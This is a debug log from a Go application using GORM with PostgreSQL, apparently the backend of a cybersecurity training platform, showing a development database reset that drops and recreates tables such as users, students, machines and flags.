
2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[15.578ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "difficulty_levels" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[2.738ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "operating_system_types" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.600ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "users" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.408ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "students" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.404ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "admins" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.523ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "instructors" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.512ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "revoked_tokens" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.487ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "revoked_refresh_tokens" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.581ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "revoked_refresh_token_admins" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.580ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "revoked_refresh_token_instructors" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.506ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "revoked_refresh_token_students" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.637ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "revoked_token_admins" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[3.047ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "revoked_token_instructors" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.574ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "revoked_token_students" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.576ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "rooms" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.557ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "room_students" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.457ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "course_machines" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.540ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "machines" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.614ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "courses" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.596ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "course_students" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[2.294ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "machine_students" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.558ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "questions" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.610ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "question_students" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.657ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "flags" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.592ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "notifications" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.620ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "notification_admins" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.616ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "notification_instructors" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.588ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "notification_students" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.575ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "hacking_machines" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:148
[0m[33m[0.585ms] [34;1m[rows:0][0m DROP TABLE IF EXISTS "hacking_machine_students" CASCADE

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[41.399ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND table_type = 'BASE TABLE'

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[46.453ms] [34;1m[rows:0][0m CREATE TABLE "difficulty_levels" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"level" text NOT NULL,PRIMARY KEY ("id"),CONSTRAINT "uni_difficulty_levels_level" UNIQUE ("level"))

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.118ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_difficulty_levels_deleted_at" ON "difficulty_levels" ("deleted_at")

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.118ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND table_type = 'BASE TABLE'

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[29.261ms] [34;1m[rows:0][0m CREATE TABLE "operating_system_types" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"type" text NOT NULL,PRIMARY KEY ("id"),CONSTRAINT "uni_operating_system_types_type" UNIQUE ("type"))

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.964ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_operating_system_types_deleted_at" ON "operating_system_types" ("deleted_at")

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.074ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[35.877ms] [34;1m[rows:0][0m CREATE TABLE "users" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"user_name" text NOT NULL,"first_name" text NOT NULL,"last_name" text NOT NULL,"middle_name" text,"email" text NOT NULL,"phone" text NOT NULL,"password" text NOT NULL,"email_verified" boolean NOT NULL DEFAULT false,"phone_verified" boolean NOT NULL DEFAULT false,"locked" boolean NOT NULL,PRIMARY KEY ("id"),CONSTRAINT "uni_users_phone" UNIQUE ("phone"),CONSTRAINT "uni_users_user_name" UNIQUE ("user_name"),CONSTRAINT "uni_users_email" UNIQUE ("email"))

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[23.355ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_users_deleted_at" ON "users" ("deleted_at")

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.441ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.834ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[56.905ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.179ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[46.340ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[34.363ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.109ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[13.860ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.437ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:42 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.096ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.229ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.769ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.873ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.055ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.025ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.314ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.088ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.045ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.206ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.082ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.216ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.078ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.904ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.818ms] [34;1m[rows:0][0m CREATE TABLE "students" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"is_premiem" boolean NOT NULL DEFAULT false,"user_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_students_user" FOREIGN KEY ("user_id") REFERENCES "users"("id"))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.859ms] [34;1m[rows:0][0m CREATE UNIQUE INDEX IF NOT EXISTS "idx_student_user" ON "students" ("user_id")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.058ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_students_deleted_at" ON "students" ("deleted_at")

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.035ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.423ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[16.173ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.669ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[25.758ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[27.655ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.926ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.042ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.016ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.075ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.073ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.064ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

